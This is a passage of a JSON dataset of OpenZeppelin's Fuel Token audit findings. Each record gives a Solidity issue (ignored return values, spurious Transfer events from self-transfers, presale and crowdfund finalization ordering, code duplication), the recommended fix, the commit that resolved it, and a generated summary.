      "impact": "MEDIUM",
      "content": "The function [`finalizeCrowdfund`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L202) is defined to return a boolean value indicating success. However, this return value is [ignored](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelCrowdfund.sol#L84) when the function is called. Since the return value is currently always `true`, consider removing it altogether. Otherwise, always check the return value.\n\n\n***Update:** The return value was removed in [`f85fc45`](https://github.com/etherparty/FUEL-Contracts/commit/f85fc459519fb63803acdfc2de52744838b83338).*",
      "summary": "\nThis bug report concerns the function `finalizeCrowdfund` in the FuelToken.sol and FuelCrowdfund.sol files. This function is supposed to return a boolean value indicating success, however it was observed that this return value was ignored when the function was called. As the return value was always `true`, it was suggested that it be removed altogether, or that the return value always be checked. This was ultimately done in the commit `f85fc459519fb63803acdfc2de52744838b83338`, and the return value was removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12012",
      "title": "Possible erroneous Transfer event in transferFrom",
      "impact": "MEDIUM",
      "content": "In [`transferFrom`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L102%5C) it is not checked that the source account has enough balance. This is not severe because, in general, the [safe subtraction](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L105) will revert the transaction if more than the available balance wants to be transferred. However, in the special case that someone calls `transferFrom` with the source and destination as the same account, the same won’t happen because the balance is [first incremented](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L104), and only then decremented. The resulting balance will remain the same, but it would be possible for anyone to emit a `Transfer` event with themselves as destination and an arbitrary amount. This might be misinterpreted for a real transfer by an application or individual. Consider swapping the lines so that the balance is first decremented and then incremented, in order for such a transaction to fail.\n\n\n***Update:** Fixed in [`4a5ba4a`](https://github.com/etherparty/FUEL-Contracts/commit/4a5ba4ae205d96df67352f028298ebbe88449f65).*",
      "summary": "\nThis bug report is about the function `transferFrom` in the FuelToken.sol contract. The issue is that it does not check that the source account has enough balance. If someone calls `transferFrom` with the source and destination as the same account, the balance is first incremented and then decremented, and the resulting balance will remain the same. This could lead to someone emitting a `Transfer` event with themselves as the destination and an arbitrary amount, which might be misinterpreted for a real transfer by an application or individual. The bug was fixed in the commit [`4a5ba4a`](https://github.com/etherparty/FUEL-Contracts/commit/4a5ba4ae205d96df67352f028298ebbe88449f65) by swapping the lines so that the balance is first decremented and then incremented, in order for such a transaction to fail.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12011",
      "title": "Unclear semantics for Transfer",
      "impact": "MEDIUM",
      "content": "The [ERC20 token standard](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md) specifies the [`Transfer`](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#transfer-1) event to log transfers. The specification is informal, and there is not an exact characterization of when the event should be emitted. However, since this event is relied on by applications, it is in the interest of the project to try to respect the semantics that applications expect. This will pay off in a better user experience, and probably lower operational costs.\n\n\nThe `Transfer` event is used throughout `FuelToken` in unexpected and inconsistent ways. When vested tokens are released (via [`releaseVanbexTeamTokens`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L179)), a [transfer from the token contract itself](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L182) is logged. This is conflicting with the expected semantics of the event, because the token contract didn’t have those tokens as part of its balance to begin with. In [`transferFromCrowdfund`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L169), the event is emitted [with the crowdfund as the source](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L174), but there was never a `Transfer` event with the crowdfund as the destination.\n\n\nConsider emitting this event with the zero address as the `from` field, which is the [accepted way](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#transfer) to log creation of tokens.\n\n\n***Update:** Fixed in [`759557a`](https://github.com/etherparty/FUEL-Contracts/commit/759557a4d5ba55b26f7f55fed514129633d9cca3) and [`a363180`](https://github.com/etherparty/FUEL-Contracts/commit/a363180b96141e8fdba2affa896c56bc0cbb1c9a).*",
      "summary": "\nThis bug report is about the ERC20 token standard, which is a set of rules used to create and manage tokens on the Ethereum blockchain. The token standard specifies the ‘Transfer’ event to log transfers, but it is not clear when this event should be emitted. The bug is related to the FuelToken, where the ‘Transfer’ event is used in unexpected and inconsistent ways. For example, when vested tokens are released, a transfer from the token contract itself is logged, which is conflicting with the expected semantics of the event.\n\nThe bug report suggests that the ‘Transfer’ event should be emitted with the zero address as the ‘from’ field, which is the accepted way to log creation of tokens. This bug has been fixed in two commits: ‘759557a’ and ‘a363180’.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12010",
      "title": "Presale balance may not be deliverable after crowdfund starts",
      "impact": "HIGH",
      "content": "The function [`deliverPresaleFuelBalance`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L226) requires that the receiver have a balance of zero. There is [a comment](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L224-L225) which states that all individual contributions will be aggregated, so that for each contributor the function will only be called once.\n\n\nHowever, in the same way as the critical issue we reported, it is implied that the presale balance will be distributed before the crowdfund even begins. It could be the case that a user buys tokens both in the presale and in the crowdfund, and if the presale balance is not delivered before the latter, the presale delivery would fail. Furthermore, since presale deliveries will be made [in batches](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L217), it would likely be very difficult to debug the cause of one batch failing.\n\n\nConsider enforcing that all presale deliveries happen before the crowdfund starts, or lifting the requirement that an account should have no balance before transferring presale tokens to it.\n\n\n***Update:** Fixed in [`7a30774`](https://github.com/etherparty/FUEL-Contracts/commit/7a30774344facfd9e374efc974f631142c63dd5c).*",
      "summary": "\nThis bug report is about the function `deliverPresaleFuelBalance` in the FuelToken.sol contract. The function requires that the receiver have a balance of zero, but this could be an issue as it is implied that the presale balance will be distributed before the crowdfund even begins. If the presale balance is not delivered before the crowdfund, the presale delivery would fail. Additionally, since presale deliveries will be made in batches, it would be difficult to debug the cause of one batch failing.\n\nThe bug was fixed in the commit `7a30774`, which enforced that all presale deliveries happen before the crowdfund starts, or lifted the requirement that an account should have no balance before transferring presale tokens to it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12009",
      "title": "Error-prone code duplication",
      "impact": "HIGH",
      "content": "There is an extremely high level of code duplication in the contracts. Although it is not causing a problem in the current version of the code, it is highly likely that small revisions will create bugs.\n\n\nFor example, there are six different implementations of transfer (for example in [`transferFromCrowdfund`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L169) and [`releaseVanbexTeamTokens`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L179)), and there are [other places](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L194) where balances are modified with confusing semantics. In the case of transfers, consider using the contract’s `transfer` function directly.\n\n\nA different case of code duplication is the [`FuelToken`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelCrowdfund.sol#L7-L10) interface used by the `FuelCrowdfund` contract. It could easily get out of sync with the actual `FuelToken` contract. Consider importing the `FuelToken.sol` file instead, and directly using the actual contract.\n\n\nIn general, be on the lookout for code duplication and consider refactoring the current code by creating internal helper functions with clearer semantics.\n\n\n***Update:** Regarding transfers, the team replied: “The `transferFromCrowdfund` and `releaseVanbexTeamTokens` methods have requirements not available in the `transfer` method. The crowdfund must be able to transfer before the tokens are able to transferred by the public, and the vanbex team tokens are not being decremented from a balance. We prefer this solution to cluttering up the transfer method itself.” The `FuelToken` interface issue was fixed in [`91f8920`](https://github.com/etherparty/FUEL-Contracts/commit/91f89205f3835f689f128d18a401d53a04b0416e).*",
      "summary": "\nThis bug report focuses on code duplication in the contracts. It has been identified that small revisions to the code could create bugs due to the high level of duplication. For example, there are six different implementations of transfer, and other places where balances are modified with confusing semantics. It is suggested that the contract’s `transfer` function should be used directly, and that the `FuelToken` interface should be imported directly from the `FuelToken.sol` file. It is also suggested that internal helper functions should be created to reduce code duplication and improve clarity of the code. The team has responded to this report, noting that the `transferFromCrowdfund` and `releaseVanbexTeamTokens` methods have requirements not available in the `transfer` method. They also fixed the `FuelToken` interface issue in the `91f8920` commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12008",
      "title": "Leftover presale supply can be left unrecoverable",
      "impact": "HIGH",
      "content": "When `FuelToken` is deployed, the total supply of 1 billion is divided into allocations destined for various purposes, including [presale](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L140) and [crowdfund](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L141). The intention is for all of the supply to be eventually sold. Out of the presale and crowdfund allocations, tokens which aren’t sold during the corresponding stage are meant to be eventually transferred to the [platform address](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L51-L52), which would later [sell them](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelCrowdfund.sol#L81) via the Etherparty platform.\n\n\nWhen the presale is finalized (via [`finalizePresale`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L189)), its remaining allocation is [transferred to the crowdfund](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L194). When the crowdfund is finalized (via [`finalizeCrowdfund`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L202)), its remaining allocation is finally [transferred to the platform](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L207). There is an *implied ordering* between these two calls which is not enforced in the smart contract code. As a consequence, the crowdfund could be mistakenly finalized before the presale, and any remaining tokens allocated for the presale would then be unrecoverable (for they would be transferred to the crowdfund address with no way to get them out anymore).\n\n\nTo prevent this, add the precondition `require(presaleFinalized)` to the [`finalizeCrowdfund`](https://github.com/etherparty/FUEL-Contracts/blob/3717b751bb2fa57ae300776a93ee4d7d7beb2c07/contracts/FuelToken.sol#L202) function.\n\n\n***Update:** Fixed in [`7a30774`](https://github.com/etherparty/FUEL-Contracts/commit/7a30774344facfd9e374efc974f631142c63dd5c).*",
      "summary": "\nThe bug report is about FuelToken, a smart contract that is deployed and divided into allocations for presale and crowdfund. The intention is for all of the supply to be eventually sold, and any remaining tokens allocated for the presale are meant to be transferred to the crowdfund address. However, there is an implied ordering between the two calls that is not enforced in the smart contract code, which could lead to the crowdfund being mistakenly finalized before the presale, and any remaining tokens allocated for the presale would then be unrecoverable.\n\nTo fix this, a precondition `require(presaleFinalized)` was added to the `finalizeCrowdfund` function. This has now been fixed in `7a30774`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Fuel Token Audit",
      "source_link": "https://blog.openzeppelin.com/fuel-token-audit-30cc02f257f5/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    }
  ]
}